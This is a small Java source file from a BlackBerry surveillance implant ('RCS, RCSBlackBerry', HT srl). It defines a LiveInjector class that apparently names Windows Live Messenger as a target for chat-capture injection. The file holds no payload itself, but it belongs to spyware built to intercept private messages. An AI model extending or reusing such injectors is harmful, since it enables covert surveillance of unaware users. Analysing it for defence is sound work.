//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection.injectors;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.group.ChatGroupInjector;

public class LiveInjector extends ChatGroupInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("MLiveInjector", DebugLevel.VERBOSE);

    //#endif
    public String getAppName() {
        return "Live";
    }

    public String getCodName() {
        return "net_rim_bb_mslive";
    }

}
